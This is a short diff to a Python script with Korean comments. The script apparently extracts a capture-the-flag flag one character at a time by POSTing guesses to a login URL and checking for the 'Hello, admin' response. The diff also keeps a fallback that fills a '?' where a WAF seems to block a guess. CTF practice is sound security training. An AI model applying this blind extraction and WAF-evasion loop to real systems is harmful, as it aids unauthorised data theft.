@@ -16,18 +16,17 @@ while True:
         
         response = requests.post(url, data=data)
 
-        if "hello admin" in response.text:
+        # 💡 [핵심 수정] 바뀐 예쁜 UI의 성공 메시지에 맞춰 대문자와 쉼표를 넣어줍니다.
+        if "Hello, admin" in response.text:
             flag += char
             print(f"[+] Pwned! 현재 플래그: {flag}")
             found = True
             break 
 
-    # 글자를 찾지 못하고 for문이 끝났을 때
     if not found:
         if flag.endswith("}"):
-            break # 진짜 끝난 거면 종료
+            break 
             
-        # 💡 [핵심 우회 로직] WAF 때문에 못 찾은 경우, 와일드카드(?)로 건너뛰기!
         print(f"[!] WAF 차단 의심. 해당 자리를 '?'로 우회하여 계속 탐색합니다.")
         flag += "?"
 
